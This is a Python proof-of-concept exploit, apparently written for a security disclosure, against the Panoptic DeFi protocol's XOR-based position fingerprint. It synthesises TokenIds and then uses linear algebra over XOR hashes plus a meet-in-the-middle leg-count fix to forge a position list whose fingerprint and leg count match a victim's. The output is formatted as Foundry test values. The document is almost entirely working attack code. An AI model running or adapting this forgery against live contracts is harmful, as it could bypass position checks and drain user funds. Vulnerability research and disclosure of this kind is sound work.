#!/usr/bin/env python3
# Panoptic XOR preimage + leg-match PoC (real keccak, TokenId.countLegs, relations MITM)
# pip install "eth-hash[pycryptodome]"

# It will put its output into an arg-supplied file - you can then convert it into values useable in a foundry test like:
"""
(pypy_venv) root@ubuntu-s-1vcpu-1gb-35gb-intel-nyc1-01:~# python3 - <<'PY'
import json
d = json.load(open("F_ts60_4242.json"))
vals = d.get("F_hex") or [hex(x) for x in d["F_dec"]]
print("uint256[] memory fake_token_uints = [")
for i,v in enumerate(vals):
    sep = "," if i < len(vals)-1 else ""
    print(f"    {v}{sep}")
print("];")
PY
"""
"""which outputs:
uint256[] memory fake_token_uints = [
    0x3c70d785e27fe5,
    0x3c69c564e59916,
    ...,
];
"""

import argparse, os, random, json
from typing import List, Optional, Tuple, Dict

# --- real keccak256 (Solidity parity) ---
try:
    from eth_hash.auto import keccak
except Exception as e:
    raise SystemExit("Install:\n  pip install 'eth-hash[pycryptodome]'\nError: " + str(e))

K_BITS = 248
MASK   = (1 << K_BITS) - 1
# TokenIdLibrary.OPTION_RATIO_MASK
OPTION_RATIO_MASK = 0x0000000000FE_0000000000FE_0000000000FE_0000000000FE_0000000000000000

# ----------------- hashing & legs -----------------
def abi_encode_uint256(x: int) -> bytes:
    return x.to_bytes(32, "big")

def h(token_id: int) -> int:
    return int.from_bytes(keccak(abi_encode_uint256(token_id)), "big") & MASK

def xor_hash(token_ids: List[int]) -> int:
    acc = 0
    for t in token_ids:
        acc ^= h(t)
    return acc

def count_legs(token_id: int) -> int:
    option_ratios = token_id & OPTION_RATIO_MASK
    if option_ratios < 2 ** 64:   return 0
    if option_ratios < 2 ** 112:  return 1
    if option_ratios < 2 ** 160:  return 2
    if option_ratios < 2 ** 208:  return 3
    return 4

def leg_sum(token_ids: List[int]) -> int:
    return sum(count_legs(t) for t in token_ids) & 0xFF

# --------- synthetically build TokenIds with L active legs ---------
# Layout (LSB→MSB): [48b poolId][16b tickSpacing][4×(48b leg)]
MIN_TICK = -887272
MAX_TICK =  887272

def make_token_id_with_L_legs(L: int, *, seed: int, ts: int) -> int:
    """
    Build a TokenId with L active legs that is valid for a Uniswap V3 pool with tickSpacing=ts.
    We pick lower/upper as multiples of ts within [MIN_TICK, MAX_TICK], then derive width & strike.
    """
    assert 0 <= L <= 4
    rnd = random.Random(seed)

    # PoolId+tickSpacing region (we don’t try to match real pool fingerprint; not required by validate())
    pool48 = rnd.getrandbits(48)
    token  = pool48 | (int(ts) << 48)  # 16-bit tickSpacing at bits [48..63]

    def put(bits: int, width: int, leg_index: int, offset_in_leg: int):
        nonlocal token
        shift = 64 + leg_index * 48 + offset_in_leg
        token |= (bits & ((1 << width) - 1)) << shift

    if L == 0:
        return token  # no active legs

    # Precompute a safe range of tick indexes (multiples of ts)
    lo_idx = (MIN_TICK // ts) + (1 if MIN_TICK % ts != 0 else 0)
    hi_idx =  MAX_TICK // ts

    for i in range(L):
        # choose a width in [1..4095]; ensure we don’t exceed tick bounds
        # prefer even widths sometimes (helps strike be multiple of ts)
        width = rnd.randint(1, 4095)
        if rnd.random() < 0.6:
            width += (width & 1)  # bump to even ~60% of the time

        # choose a lower index so that upper=lower+width is within bounds
        a = rnd.randint(lo_idx, hi_idx - width)
        b = a + width

        lower = a * ts
        upper = b * ts
        strike = (lower + upper) // 2  # integer; valid because (lower+upper) even multiple of ts

        # Sanity: ensure we didn’t hit MIN/MAX (Panoptic forbids exactly MIN/MAX)
        if strike == MIN_TICK or strike == MAX_TICK or width == 0:
            # fallback: shift inwards if needed
            a = max(a, lo_idx + 1)
            b = min(b, hi_idx - 1)
            lower = a * ts
            upper = b * ts
            width = b - a
            strike = (lower + upper) // 2

        # Now fill the 48-bit leg:
        asset      = rnd.randrange(2)         # 0 or 1
        optionRatio= rnd.randrange(1, 4)      # 1..3 (active)
        isLong     = rnd.randrange(2)         # 0 or 1
        tokenType  = rnd.randrange(2)         # 0 or 1
        riskPart   = i                        # default self-partner; safe for validation

        put(asset,        1, i, 0)
        put(optionRatio,  7, i, 1)
        put(isLong,       1, i, 8)
        put(tokenType,    1, i, 9)
        put(riskPart,     2, i,10)
        # strike is int24; width is uint12
        # encode strike as signed int24 stored at offset 12
        put(int(strike) & 0xFFFFFF, 24, i, 12)
        put(int(width)  & 0xFFF,    12, i, 36)

    # Remaining legs (if any) are inactive zeros automatically.
    return token

# ------------- XOR basis with zero-XOR relation capture -------------
class XorBasisWithRelations:
    def __init__(self, k_bits: int):
        self.k = k_bits
        self.pivot = [0] * k_bits
        self.comb  = [0] * k_bits
        self.relations: List[int] = []  # masks over candidate indices s.t. XOR==0

    @staticmethod
    def _msb_pos(x: int) -> int:
        return x.bit_length() - 1

    def insert(self, vec: int, mask: int) -> None:
        v, m = vec, mask
        while v:
            i = self._msb_pos(v)
            if self.pivot[i]:
                v ^= self.pivot[i]
                m ^= self.comb[i]
            else:
                self.pivot[i] = v
                self.comb[i] = m
                return
        if m:
            self.relations.append(m)  # zero-XOR relation found

    def solve(self, target: int) -> Optional[int]:
        t, sol = target, 0
        while t:
            i = self._msb_pos(t)
            if not self.pivot[i]:
                return None
            t  ^= self.pivot[i]
            sol ^= self.comb[i]
        return sol

def basis_solve_with_relations(target: int, candidates: List[int]) -> Tuple[Optional[List[int]], List[int]]:
    basis = XorBasisWithRelations(K_BITS)
    for idx, tok in enumerate(candidates):
        basis.insert(h(tok), 1 << idx)
    mask = basis.solve(target)
    if mask is None:
        return None, basis.relations
    subset, i = [], 0
    while mask:
        if mask & 1:
            subset.append(i)
        mask >>= 1; i += 1
    return subset, basis.relations

# ---------------- leg-delta helpers (mod 256) ----------------
def legs_delta_of_mask(mask: int, items: List[int], legs_cache: Dict[int, int]) -> int:
    total = 0; i = 0; m = mask
    while m:
        if m & 1:
            tok = items[i]
            if tok not in legs_cache:
                legs_cache[tok] = count_legs(tok)
            total += legs_cache[tok]
        m >>= 1; i += 1
    return total & 0xFF

# Even-delta fix using duplicate pairs (XOR cancels, legs += 2*L)
def even_delta_fix_with_pairs(need: int, pool_by_L: Dict[int, List[int]]) -> Optional[List[int]]:
    if need & 1:  # odd need not solvable with pairs alone
        return None
    half = (need // 2) & 0x7F
    out: List[int] = []
    for L in (4, 3, 2, 1):
        if half == 0:
            break
        avail = pool_by_L.get(L, [])
        use = min(len(avail), half // L)
        for t in avail[:use]:
            out.extend([t, t])
        half -= use * L
    return out if half == 0 else None

# General odd/even fix via zero-XOR relations (meet-in-the-middle)
def mitm_relations_fix(need: int, relations: List[int], candidates: List[int], legs_cache: Dict[int, int], limit: int = 22) -> Optional[int]:
    R = relations[:]
    if not R:
        return None
    left, right = R[:limit], R[limit:2*limit]

    left_map: Dict[int, int] = {0: 0}
    for i, rel_mask in enumerate(left):
        for delta, m in list(left_map.items()):
            nm = m | (1 << i)
            nd = (delta + legs_delta_of_mask(rel_mask, candidates, legs_cache)) & 0xFF
            if nd not in left_map:
                left_map[nd] = nm

    base = len(left)
    right_list = [(0, 0)]
    for j, rel_mask in enumerate(right):
        for delta, m in list(right_list):
            nm = m | (1 << (base + j))
            nd = (delta + legs_delta_of_mask(rel_mask, candidates, legs_cache)) & 0xFF
            right_list.append((nd, nm))

    for dr, mr in right_list:
        need_l = (need - dr) & 0xFF
        if need_l in left_map:
            return left_map[need_l] | mr
    return None

# ----------------------- CLI + runner -----------------------
def parse_ids(s: str) -> List[int]:
    if not s:
        return []
    out = []
    for part in s.split(","):
        part = part.strip()
        out.append(int(part, 16) if part.lower().startswith("0x") else int(part))
    return out

def main():
    ap = argparse.ArgumentParser(description="Panoptic XOR preimage + leg match PoC")
    ap.add_argument("--original",      type=str, default="3778244379283224750028086288639,2570843629053219139838802108671",
                    help="Comma-separated original TokenIds (dec or 0x-hex)")
    ap.add_argument("--must-include",  type=str, default="",
                    help="Comma-separated TokenIds that MUST be included (can be empty)")
    ap.add_argument("--candidates",    type=int, default=int(os.getenv("CANDIDATES","2000")),
                    help="Total synthetic candidates (spread across 0..4 legs)")
    ap.add_argument("--per_class",     type=int, default=500,
                    help="Per leg-count class if --candidates <= 0")
    ap.add_argument("--limit",         type=int, default=int(os.getenv("LIMIT","22")),
                    help="MITM relations limit per side (22≈8M pairs)")
    ap.add_argument("--seed",          type=int, default=int(os.getenv("SEED","1337")),
                    help="PRNG seed (first run)")
    ap.add_argument("--save",          type=str, default="",
                    help="Append success summary to this JSONL")
    ap.add_argument("--print_full",    action="store_true",
                    help="Print target and forged full256 values")
    ap.add_argument("--repeat",        type=int, default=1,
                    help="Repeat the search this many times")
    ap.add_argument("--vary_seed",     action="store_true",
                    help="Increment seed each repetition")
    ap.add_argument("--dump_f",        type=str, default="",
                    help="Write final forged list F (JSON) to this file")
    ap.add_argument("--dump_stdout",   action="store_true",
                    help="Also print F (dec and hex) to stdout")
    ap.add_argument("--tick_spacing",  type=int, default=60,
                    help="Tick spacing of the target pool, for tokenId construction")
    args = ap.parse_args()

    def run_once(seed: int) -> bool:
        random.seed(seed)
        original = parse_ids(args.original)
        must     = parse_ids(args.must_include)

        target_fp   = xor_hash(original)
        target_legs = leg_sum(original)
        full256_target = (target_legs << 248) | target_fp

        if args.print_full:
            print("fingerprint248:", target_fp)
            print("legCount     :", target_legs)
            print("target full256 :", full256_target)

        # candidate universe
        total = args.candidates
        per   = args.per_class if total <= 0 else max(1, total // 5)
        candidates: List[int] = []
        pool_by_L: Dict[int, List[int]] = {0:[],1:[],2:[],3:[],4:[]}
        for L in range(5):
            for j in range(per):
                tok = make_token_id_with_L_legs(L, seed=10_000*L + seed + j, ts=args.tick_spacing)
                candidates.append(tok)
                pool_by_L[L].append(tok)

        # 1) fingerprint solve
        delta = target_fp ^ xor_hash(must)
        subset_idx, relations = basis_solve_with_relations(delta, candidates)
        if subset_idx is None:
            print("No fingerprint solution; increase --candidates.")
            return False

        P = [candidates[i] for i in subset_idx]
        F = must + P

        ok_fp    = (xor_hash(F) == target_fp)
        legs_now = leg_sum(F)
        need     = (target_legs - legs_now) & 0xFF
        print(f"[fingerprint] ok={ok_fp} | |F|={len(F)} (|must|={len(must)}, |P|={len(P)})")
        print(f"[legs] target={target_legs} now={legs_now} need={need}")

        # 2) leg fix (pairs first, then relations)
        if need != 0:
            dup = even_delta_fix_with_pairs(need, pool_by_L)
            if dup is not None:
                F += dup
            else:
                legs_cache: Dict[int, int] = {}
                rel_mask = mitm_relations_fix(need, relations, candidates, legs_cache, limit=args.limit)
                if rel_mask is None:
                    print("Could not fix legs; increase --candidates or --limit.")
                    return False
                # materialize chosen relations once (append toggles)
                i, m = 0, rel_mask
                while m:
                    if m & 1:
                        rmask = relations[i]
                        j, rr = 0, rmask
                        while rr:
                            if rr & 1:
                                F.append(candidates[j])
                            rr >>= 1; j += 1
                    m >>= 1; i += 1

        ok_fp2     = (xor_hash(F) == target_fp)
        legs_final = leg_sum(F)
        full256_forged = (legs_final << 248) | xor_hash(F)

        if args.print_full:
            print("forged full256  :", full256_forged)

        print(f"[final] fp_ok={ok_fp2} legs={legs_final} (target={target_legs}) |F|={len(F)}")

        # optionally dump the list F
        if args.dump_stdout or args.dump_f:
            rec_full = {
                "target_full256": str(full256_target),
                "forged_full256": str(full256_forged),
                "target_legs": target_legs,
                "forged_legs": legs_final,
                "lenF": len(F),
                "F_dec": F,
                "F_hex": [hex(t) for t in F],
            }
            if args.dump_stdout:
                print("F_dec:", rec_full["F_dec"])
                print("F_hex:", rec_full["F_hex"])
            if args.dump_f:
                with open(args.dump_f, "w") as f:
                    json.dump(rec_full, f, indent=2)
                print(f"[saved] wrote forged list to {args.dump_f}")

        if args.save and ok_fp2 and legs_final == target_legs:
            rec = {
                "seed": seed,
                "candidates": args.candidates,
                "limit": args.limit,
                "lenF": len(F),
                "legs": legs_final,
                "target_legs": target_legs,
                "target_full256": str(full256_target),
                "forged_full256": str(full256_forged),
            }
            with open(args.save, "a") as f:
                f.write(json.dumps(rec) + "\n")

        return ok_fp2 and legs_final == target_legs

    # repeat loop
    seed = args.seed
    for r in range(args.repeat):
        print(f"=== run {r+1}/{args.repeat} seed={seed} ===")
        ok = run_once(seed)
        if args.vary_seed:
            seed += 1

if __name__ == "__main__":
    main()
